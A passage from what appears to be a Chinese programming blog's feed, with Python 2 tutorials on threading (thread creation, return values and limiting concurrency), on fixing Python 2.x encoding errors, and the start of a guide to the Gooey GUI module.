<h3 id="Multiprocessing-dummy模块"><a href="#Multiprocessing-dummy模块" class="headerlink" title="Multiprocessing.dummy模块"></a>Multiprocessing.dummy模块</h3><p>Multiprocessing.dummy用法与多进程Multiprocessing用法类似，只是在import包的时候，加上.dummy。<br>用法参考<a href="http://thief.one/2016/11/23/Python-multiprocessing/">Multiprocessing用法</a></p>
<h3 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h3><p>　　这是python自带的threading多线程模块，其创建多线程主要有2种方式。一种为继承threading类，另一种使用threading.Thread函数，接下来将会分别介绍这两种用法。</p>
<h4 id="Usage【1】"><a href="#Usage【1】" class="headerlink" title="Usage【1】"></a>Usage【1】</h4><p>利用threading.Thread()函数创建线程。<br>代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">def run(i):</div><div class="line">	<span class="built_in">print</span> i</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10):</div><div class="line">	t=threading.Thread(target=run,args=(i,))</div><div class="line">	t.start()</div></pre></td></tr></table></figure></p>
<p>　　说明：Thread()函数有2个参数，一个是target，内容为子线程要执行的函数名称；另一个是args，内容为需要传递的参数。创建完子线程，将会返回一个对象，调用对象的start方法，可以启动子线程。</p>
<p>线程对象的方法：</p>
<ul>
<li>Start()                                 开始线程的执行</li>
<li>Run()                                  定义线程的功能的函数</li>
<li>Join(timeout=None)           程序挂起，直到线程结束；如果给了timeout，则最多阻塞timeout秒</li>
<li>getName()                          返回线程的名字</li>
<li>setName()                           设置线程的名字</li>
<li>isAlive()                               布尔标志，表示这个线程是否还在运行</li>
<li>isDaemon()                         返回线程的daemon标志</li>
<li>setDaemon(daemonic)        把线程的daemon标志设为daemonic（一定要在start（）函数前调用）</li>
<li>t.setDaemon(True)               把父线程设置为守护线程，当父进程结束时，子进程也结束。</li>
</ul>
<p>threading类的方法：</p>
<ul>
<li>threading.enumerate()        正在运行的线程数量</li>
</ul>
<h4 id="Usage【2】"><a href="#Usage【2】" class="headerlink" title="Usage【2】"></a>Usage【2】</h4><p>通过继承threading类，创建线程。<br>代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">import threading</div><div class="line"></div><div class="line">class <span class="built_in">test</span>(threading.Thread):</div><div class="line">    def __init__(self):</div><div class="line">        threading.Thread.__init__(self)</div><div class="line"></div><div class="line">    def run(self):</div><div class="line">        try:</div><div class="line">            <span class="built_in">print</span> <span class="string">"code one"</span></div><div class="line">        except:</div><div class="line">            pass</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10):</div><div class="line">    cur=<span class="built_in">test</span>()</div><div class="line">    cur.start()</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10):</div><div class="line">    cur.join()</div></pre></td></tr></table></figure></p>
<p>说明：此方法继承了threading类，并且重构了run函数功能。</p>
<h3 id="获取线程返回值问题"><a href="#获取线程返回值问题" class="headerlink" title="获取线程返回值问题"></a>获取线程返回值问题</h3><p>　　有时候，我们往往需要获取每个子线程的返回值。然而通过调用普通函数，获取return值的方式在多线程中并不适用。因此需要一种新的方式去获取子线程返回值。<br>代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">import threading</div><div class="line"></div><div class="line">class <span class="built_in">test</span>(threading.Thread):</div><div class="line">    def __init__(self):</div><div class="line">        threading.Thread.__init__(self)</div><div class="line"></div><div class="line">    def run(self):</div><div class="line">        self.tag=1</div><div class="line"></div><div class="line">    def get_result(self):</div><div class="line">        <span class="keyword">if</span> self.tag==1:</div><div class="line">            <span class="built_in">return</span> True</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="built_in">return</span> False</div><div class="line"></div><div class="line">f=<span class="built_in">test</span>()</div><div class="line">f.start()</div><div class="line"><span class="keyword">while</span> f.isAlive():</div><div class="line">    <span class="built_in">continue</span></div><div class="line"><span class="built_in">print</span> f.get_result()</div></pre></td></tr></table></figure></p>
<p>　　说明：多线程获取返回值的首要问题，就是子线程什么时候结束？我们应该什么时候去获取返回值？可以使用isAlive()方法判断子线程是否存活。</p>
<h3 id="控制线程运行数目"><a href="#控制线程运行数目" class="headerlink" title="控制线程运行数目"></a>控制线程运行数目</h3><p>当需要执行的任务非常多时，我们往往需要控制线程的数量，threading类自带有控制线程数量的方法。<br>代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">import threading</div><div class="line"></div><div class="line">maxs=10  <span class="comment">##并发的线程数量</span></div><div class="line">threadLimiter=threading.BoundedSemaphore(maxs)</div><div class="line">class <span class="built_in">test</span>(threading.Thread):</div><div class="line">    def __init__(self):</div><div class="line">        threading.Thread.__init__(self)</div><div class="line"></div><div class="line">    def run(self):</div><div class="line">        threadLimiter.acquire()  <span class="comment">#获取</span></div><div class="line">        try:</div><div class="line">            <span class="built_in">print</span> <span class="string">"code one"</span></div><div class="line">        except:</div><div class="line">            pass</div><div class="line">        finally:</div><div class="line">            threadLimiter.release() <span class="comment">#释放</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(100):</div><div class="line">    cur=<span class="built_in">test</span>()</div><div class="line">    cur.start()</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(100):</div><div class="line">    cur.join()</div></pre></td></tr></table></figure></p>
<p>说明：以上程序可以控制多线程并发数为10，超过这个数量会引发异常。<br>除了自带的方法，我们还可以设计其他方案：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">threads=[]</div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">创建所有线程</div><div class="line">'<span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10):</div><div class="line">	t=threading.Thread(target=run,args=(i,))</div><div class="line">	threads.append(t)</div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">启动列表中的线程</div><div class="line">'<span class="string">''</span></div><div class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</div><div class="line">    t.start()</div><div class="line">    <span class="keyword">while</span> True:</div><div class="line">        <span class="comment">#判断正在运行的线程数量,如果小于5则退出while循环,</span></div><div class="line">        <span class="comment">#进入for循环启动新的进程.否则就一直在while循环进入死循环</span></div><div class="line">        <span class="keyword">if</span>(len(threading.enumerate())&lt;5):</div><div class="line">            <span class="built_in">break</span></div></pre></td></tr></table></figure></p>
<p>以上两种方式皆可以，本人更喜欢用下面那种方式。</p>
<p><em>多进程问题，可以赶赴<a href="http://thief.one/2016/11/23/Python-multiprocessing/">Python多进程</a>现场，其他关于多线程问题，可以下方留言讨论</em></p>
<p>申明：本文谈不上原创，其中借鉴了网上很多大牛的文章，本人只是在此测试论述Python多线程相关问题，并简单介绍Python多线程的基本用法，为新手朋友解惑。</p>
]]></content>
      
        <categories>
            
            <category> 编程之道 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python多线程 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[解决Python2.x编码之殇]]></title>
      <url>http://thief.one/2017/02/16/%E8%A7%A3%E5%86%B3Python2-x%E7%BC%96%E7%A0%81%E4%B9%8B%E6%AE%87/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center">技术的探索，就好像编织故事一般，其乐趣在于偶尔能够讲述给别人听，并获得一些赞同！</blockquote><br>Python编码问题一直困扰了我许久，之前有过一些总结，但并不系统，比较凌乱。当然python2.x编码问题本身，便是剪不断理还乱。本篇将系统介绍python2.x编程中会遇到的一些编码问题，并给出解决方案。基于对编码问题的摸索了解，我也尝试写了一个编码转换模块<a href="https://github.com/tengzhangchao/Transcode" target="_blank" rel="external">Transcode</a>，应该能解决绝大部分新手的疑难杂症。当然，python大神可以绕道而行，至于使用3.x的朋友，以后将会成文介绍。<br><a id="more"></a><br>　　python编程中会经常遇到操作系统编码、文件编码、控制台输入输出编码、网页编码、源代码编码、python编码，本文将会逐一介绍。首先我们来看看一些常见的编码情况：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">print</span> sys.getdefaultencoding()    <span class="comment">#系统默认编码</span></div><div class="line"><span class="built_in">print</span> sys.getfilesystemencoding() <span class="comment">#文件系统编码</span></div><div class="line"><span class="built_in">print</span> locale.getdefaultlocale()   <span class="comment">#系统当前编码</span></div><div class="line"><span class="built_in">print</span> sys.stdin.encoding          <span class="comment">#终端输入编码</span></div><div class="line"><span class="built_in">print</span> sys.stdout.encoding         <span class="comment">#终端输出编码</span></div></pre></td></tr></table></figure></p>
<p>将以上这段代码在windows与linux系统下分别运行，查看输出结果。<br>windows终端结果:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ascii</div><div class="line">mbcs</div><div class="line">(<span class="string">'zh_CN'</span>, <span class="string">'cp936'</span>)</div><div class="line">cp936</div><div class="line">cp936</div></pre></td></tr></table></figure></p>
<p>Linux终端结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ascii</div><div class="line">UTF-8</div><div class="line">(<span class="string">'zh_CN'</span>, <span class="string">'UTF-8'</span>)</div><div class="line">UTF-8</div><div class="line">UTF-8</div></pre></td></tr></table></figure></p>
<h3 id="操作系统编码"><a href="#操作系统编码" class="headerlink" title="操作系统编码"></a>操作系统编码</h3><p>　　操作系统默认编码可以通过sys.getdefaultencoding()函数获取，可以看到windows与linux下默认都为ascii编码，而我们知道ascii编码不支持中文。那么操作系统编码将在python程序的何处会被用到呢？何时又会引发血案？</p>
<h4 id="触发异常点"><a href="#触发异常点" class="headerlink" title="触发异常点"></a>触发异常点</h4><p>　　经过测试，我发现当需要将unicode格式的字符串存入到文件时，python内部会默认将其先转换为Str格式的系统编码，然后再执行存入步骤。而在这过程中，容易引发ascii异常。<br>实例证明：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></div><div class="line">a=u<span class="string">"中文"</span></div><div class="line">f=open(<span class="string">"test.txt"</span>,<span class="string">"w"</span>)</div><div class="line">f.write(a)</div></pre></td></tr></table></figure></p>
<p>报错异常信息：UnicodeEncodeError: ‘ascii’ codec can’t encode characters in position 0-1……<br>说明：因为ascii不支持中文，而变量a为unicode格式的中文字符串，因此无法进行编码而引发异常。</p>
<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>设置系统编码为utf-8或者gbk。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import sys</div><div class="line">reload(sys)</div><div class="line">sys.setdefaultencoding(<span class="string">'gbk'</span>)</div></pre></td></tr></table></figure></p>
<p>说明：在windows下将其设置为gbk，在linux在设置为utf-8.</p>
<h3 id="终端编码"><a href="#终端编码" class="headerlink" title="终端编码"></a>终端编码</h3><p>　　windows下终端指的是控制台，在控制台上输入输出有着其本身的编码格式，如windows控制台输入输出编码都为cp936。原谅我是第一次看到此编码，于是上网查了会，发现其实它就是常见的GBK编码；而linux终端的输入输出编码都为utf-8。如果我们编写的程序，不会再终端输入输出任何内容，则可以忽略此编码，如若不然终端编码将会非常重要。</p>
<h4 id="乱码点"><a href="#乱码点" class="headerlink" title="乱码点"></a>乱码点</h4><p>我们在终端执行python脚本时，经常会遇到输出中文乱码，而这往往是因为输出的字符串本身编码与控制台编码不一致。<br>实例证明：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></div><div class="line">a=<span class="string">"中文"</span>  <span class="comment">#定义一个变量，默认为Str，utf-8编码</span></div><div class="line"><span class="built_in">print</span> a</div><div class="line"><span class="built_in">print</span> <span class="built_in">type</span>(a)</div></pre></td></tr></table></figure></p>
<p>windows控制台输出结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">浣犲ソ</div><div class="line">&lt;<span class="built_in">type</span> <span class="string">'str'</span>&gt;</div></pre></td></tr></table></figure></p>
<p>linux终端输出结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">中文</div><div class="line">&lt;<span class="built_in">type</span> <span class="string">'str'</span>&gt;</div></pre></td></tr></table></figure></p>
<p>造成这种差异的原因在于windows控制台为gbk编码，而变量a本身为utf-8编码。</p>
<h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></div><div class="line">a=<span class="string">'你好'</span></div><div class="line">b=a.decode(<span class="string">"utf-8"</span>).encode(<span class="string">"gbk"</span>)</div><div class="line"><span class="built_in">print</span> b</div></pre></td></tr></table></figure>
<p>将变量a从utf-8编码转换为gbk编码。</p>
<h3 id="python编码"><a href="#python编码" class="headerlink" title="python编码"></a>python编码</h3><p>　　python2.x从外部获取的内容都是string编码，其内部分为String编码与Unicode编码，而String编码又分为UTF-8，GBK，GB2312等等。因此为了避免不同编码造成的报错，python内部最好都转化为unicode编码，在输出时再转化为str编码 。可以用encode()/decode()函数，将string与unicode编码互换。</p>
<h4 id="触发异常点-1"><a href="#触发异常点-1" class="headerlink" title="触发异常点"></a>触发异常点</h4><p>基本在于python内部变量编码与控制台编码，或者其他编码相结合时触发。<br>实例证明：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></div><div class="line">a=<span class="string">"中文"</span>  <span class="comment">#定义一个变量，默认为str，utf-8编码</span></div><div class="line"><span class="built_in">print</span> a</div><div class="line"><span class="built_in">print</span> <span class="built_in">type</span>(a)</div></pre></td></tr></table></figure></p>
<p>运行结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">浣犲ソ</div><div class="line">&lt;<span class="built_in">type</span> <span class="string">'str'</span>&gt;</div></pre></td></tr></table></figure></p>
<p>　　说明：windows下控制台输入输出都是gbk编码格式，而代码中定义的变量a为str，utf-8格式，所以会出现乱码。如果想创建一个unicode编码字符串的变量，则可以a=u”123”，在双引号前面加上一个u，表示a为unicode编码。</p>
<h4 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案"></a>解决方案</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></div><div class="line">a=<span class="string">'你好'</span></div><div class="line"><span class="built_in">print</span> a.decode(<span class="string">"utf-8"</span>).encode(<span class="string">"gbk"</span>)</div></pre></td></tr></table></figure>
<p>　　说明：首先我们定义的变量a是str格式，编码为utf-8的字符串，我们要将之转化为str格式，GBK编码的字符串。在python内部无法直接转化，需要借助decode()与encode()函数。decode()函数先将str格式的字符串a转化为unicode，再将unicode编码为str格式GBK。而在Unix系统下，不存在这个问题，因为都是utf-8编码，不会存在乱码。print语句默认会将unicode编码的字符串，encode为相应系统的str编码并输出（windows下为gbk,unix下为utf-8）,因此不用担心print unicode编码字符串会报错。</p>
<h3 id="源代码编码"><a href="#源代码编码" class="headerlink" title="源代码编码"></a>源代码编码</h3><p>源代码编码指的是python程序本身的编码，默认为ascii。</p>
<h4 id="触发异常点-2"><a href="#触发异常点-2" class="headerlink" title="触发异常点"></a>触发异常点</h4><p>　　python程序本身要被解释器解析执行，需要先被转化为二进制代码。而在这过程中容易引发异常，原因同样是ascii不支持中文，因此当python程序中出现中文时，哪怕是注释，也会引发ascii异常。<br>实例证明：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">print</span> <span class="string">"中文"</span>  <span class="comment">#中文注释</span></div></pre></td></tr></table></figure></p>
<p>报错：SyntaxError: Non-ASCII character ‘\xe7’……</p>
<h4 id="解决方案-3"><a href="#解决方案-3" class="headerlink" title="解决方案"></a>解决方案</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></div></pre></td></tr></table></figure>
<p>python程序开头加上这句代码，指定python源代码编码格式为utf-8。</p>
<h3 id="文件编码"><a href="#文件编码" class="headerlink" title="文件编码"></a>文件编码</h3><p>　　文件编码指的是，python程序从文件中获取的内容的编码格式。可以用sys.getfilesystemencoding()函数获取，windows下为mbcs，linux下为utf-8。至于mbcs，是一种多字节编码（没搞很明白）。</p>
<h4 id="触发异常点（读取文件内容）"><a href="#触发异常点（读取文件内容）" class="headerlink" title="触发异常点（读取文件内容）"></a>触发异常点（读取文件内容）</h4><p>当python程序从文件中获取内容，并输出时，容易触发异常。<br>实例证明：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></div><div class="line">f=open(<span class="string">"test.txt"</span>,<span class="string">"r"</span>)</div><div class="line">content=f.read()</div><div class="line"><span class="built_in">print</span> <span class="built_in">type</span>(content)</div><div class="line"><span class="built_in">print</span> content</div></pre></td></tr></table></figure></p>
<p>运行结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="built_in">type</span> <span class="string">'str'</span>&gt;</div><div class="line">你好</div></pre></td></tr></table></figure></p>
<p>　　可以看到windows下，从文件中读取的编码格式为Str，GBK格式（因为控制台输出没有中文乱码）；而在Unix下为Str，Utf-8格式。从输出内容来说，并没有触发异常，然而当这些内容与python程序自身内容相结合时，容易触发异常。</p>
<h4 id="解决方案-4"><a href="#解决方案-4" class="headerlink" title="解决方案"></a>解决方案</h4><p>在windows下，最好将文件内容转为unicode，可以使用codecs：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">f=codecs.open(<span class="string">"test.txt"</span>, encoding=<span class="string">'gbk'</span>).read()</div></pre></td></tr></table></figure></p>
<p>将格式为gbk的文件内容转化为unicode格式，当然也可以直接使用open(“”,”r”).read().decode(“gbk”)</p>
<h4 id="触发异常点（写入文件内容）"><a href="#触发异常点（写入文件内容）" class="headerlink" title="触发异常点（写入文件内容）"></a>触发异常点（写入文件内容）</h4><p>参考操作系统编码触发异常点，即将中文unicode字符写入文件时，容易触发异常。</p>
<h4 id="解决方案-5"><a href="#解决方案-5" class="headerlink" title="解决方案"></a>解决方案</h4><p>参考操作系统编码解决方案，或者手动将unicode编码转换为str编码。<br>实例证明：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></div><div class="line">a=u<span class="string">"中文"</span>  <span class="comment">#a为unicode格式编码</span></div><div class="line">f=open(<span class="string">"test.txt"</span>,<span class="string">"w"</span>)</div><div class="line">f.write(a.encode(<span class="string">"gbk"</span>))</div></pre></td></tr></table></figure></p>
<p>当然如果变量a本身就是Str则不会报错，只是utf-8编码的内容写入windows文件中，显示会乱码。</p>
<h3 id="网页编码"><a href="#网页编码" class="headerlink" title="网页编码"></a>网页编码</h3><p>　　网页编码，通常在写爬虫的时候经常遇到，再结合系统编码，python编码，文件编码，往往会搞得一团乱。在程序中我们应该分别处理这些编码，在python内部全部转化为unicode。那么网页编码又有哪些格式呢？<br>常见格式：utf-8，gbk，gb2312</p>
<h4 id="触发异常点-3"><a href="#触发异常点-3" class="headerlink" title="触发异常点"></a>触发异常点</h4><p>还是在于从网页中获取的源码编码与终端编码，甚至python内部编码不一致的情况。<br>实例证明：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!coding=utf-8</span></div><div class="line">import urllib2</div><div class="line">body=urllib2.urlopen(<span class="string">'http://thief.one'</span>).read()</div><div class="line"><span class="built_in">print</span> <span class="built_in">type</span>(body)</div><div class="line"><span class="built_in">print</span> body</div></pre></td></tr></table></figure></p>
<p>运行结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="built_in">type</span> <span class="string">'str'</span>&gt;</div><div class="line">body中文显示乱码</div></pre></td></tr></table></figure></p>
<p>说明：这个网站的编码是utf-8，而且python从网页上爬取的内容都为Str格式，在windows控制台下输出会乱码。</p>
<h4 id="解决方案-6"><a href="#解决方案-6" class="headerlink" title="解决方案"></a>解决方案</h4><p>　　依照之前做法，先将其转化为unicode。而相应的正则也可以为unicode编码，如：res=r’’+u”新成员”。可以通过chardet模块判断网页编码类型，返回的是一个带概率的字典。</p>
<h3 id="编码判断"><a href="#编码判断" class="headerlink" title="编码判断"></a>编码判断</h3><h4 id="判断字符串编码"><a href="#判断字符串编码" class="headerlink" title="判断字符串编码"></a>判断字符串编码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">isinstance(obj, (str, unicode))</div></pre></td></tr></table></figure>
<p>返回True或者False</p>
<h4 id="判断网页编码"><a href="#判断网页编码" class="headerlink" title="判断网页编码"></a>判断网页编码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">import chardet</div><div class="line">import urllib2</div><div class="line">body=urllib2.urlopen(<span class="string">"http://thief.one"</span>).read()</div><div class="line">chardet.detect(body)</div></pre></td></tr></table></figure>
<p>判断编码格式，会有百分比，一般用来判断网页编码比较好。</p>
<h4 id="判断系统编码"><a href="#判断系统编码" class="headerlink" title="判断系统编码"></a>判断系统编码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">print</span> sys.getdefaultencoding()    <span class="comment">#系统默认编码</span></div><div class="line"><span class="built_in">print</span> sys.getfilesystemencoding() <span class="comment">#文件系统编码</span></div><div class="line"><span class="built_in">print</span> locale.getdefaultlocale()   <span class="comment">#系统当前编码</span></div><div class="line"><span class="built_in">print</span> sys.stdin.encoding          <span class="comment">#终端输入编码</span></div><div class="line"><span class="built_in">print</span> sys.stdout.encoding         <span class="comment">#终端输出编码</span></div></pre></td></tr></table></figure>
<h3 id="python2-x编码建议"><a href="#python2-x编码建议" class="headerlink" title="python2.x编码建议"></a>python2.x编码建议</h3><ul>
<li>请尽量在Linux系统上编程，综上我们可以知道linux下较windows，编码问题良好很多。</li>
<li>python代码内部请全部使用unicode编码，在获取外部内容时，先decode为unicode，向外输出时再encode为Str</li>
<li>在定义变量或者正则时，也定义unicode字符，如a=u”中文”；res=r””+u”正则”。</li>
</ul>
<h3 id="其他疑难杂症"><a href="#其他疑难杂症" class="headerlink" title="其他疑难杂症"></a>其他疑难杂症</h3><p>实例一：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">a=<span class="string">"\\u8fdd\\u6cd5\\u8fdd\\u89c4"</span></div><div class="line"><span class="built_in">print</span> a</div></pre></td></tr></table></figure></p>
<p>变量a的内容本身为unicode编码，怎么正常显示输入？<br>解决方案：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">a=<span class="string">"\\u8fdd\\u6cd5\\u8fdd\\u89c4"</span> <span class="comment"># unicode转化为中文</span></div><div class="line">b=a.decode(<span class="string">'unicode-escape'</span>)</div><div class="line"><span class="built_in">print</span> b</div></pre></td></tr></table></figure></p>
<p><hr><br>　　如果阅读完本章，增加了您对python编码问题的认识，那我会感到欣慰，如有python编码上的问题可以在下方留言。<br>　　如果阅读完本章，您仍然不知如何解决python乱码问题，没关系，请继续移步阅读<a href="https://github.com/tengzhangchao/Transcode" target="_blank" rel="external">Transcode解决python编码问题</a></p>
<p><em>　　为了能够让您重视，我不得不再次重申：解决python2.x编码问题的关键，在于要明白无论从哪里来的内容，在python内部流通时，都应该先转换为unicode。（python3.x在这方面做了改进，并取得了很好的效果）</em></p>
]]></content>
      
        <categories>
            
            <category> 编程之道 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python编码问题 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Gooey魔法]]></title>
      <url>http://thief.one/2017/02/15/Gooey%E9%AD%94%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>　　Gooey是python的一个扩展模块，能够使用一条命令，将命令行程序变成一个 GUI 程序。它能够解析argparse模块的命令行参数，将之变成wxpython的GUI控件。当然，Gooey本身也带有命令行解析的函数—GooeyParser。下面就简单介绍Gooey的用法，以及优缺点。</p>
<h3 id="安装Gooey"><a href="#安装Gooey" class="headerlink" title="安装Gooey"></a>安装Gooey</h3><p>最简单的安装方法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install Gooey</div></pre></td></tr></table></figure></p>
<p>或者：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/chriskiehl/Gooey.git</div></pre></td></tr></table></figure></p>
<p>然后运行setup.py :<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python setup.py install</div></pre></td></tr></table></figure></p>
<p>相关依赖：<br>wxpython<br>安装：pip install wxpython (windows下需要去官网下载安装包)</p>
<h3 id="使用Gooey转化argparse"><a href="#使用Gooey转化argparse" class="headerlink" title="使用Gooey转化argparse"></a>使用Gooey转化argparse</h3><p>最简单的例子，将argparse参数转化为GUI控件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">from gooey import Gooey</div><div class="line">import argparse</div><div class="line"></div><div class="line">@Gooey()</div><div class="line">def main():</div><div class="line">	parser = argparse.ArgumentParser()</div><div class="line">	parser.add_argument(<span class="string">"test"</span>,<span class="built_in">help</span>=<span class="string">"this is a test"</span> )</div><div class="line">	args=parser.parse_args()</div><div class="line">	<span class="built_in">print</span> args</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure></p>
<p>运行截图：<br><img src="/upload_image/20170215/1.png" alt=""></p>
<p>说明：可以看到Gooey作为装饰器使用，Gooey()可以设置参数。</p>
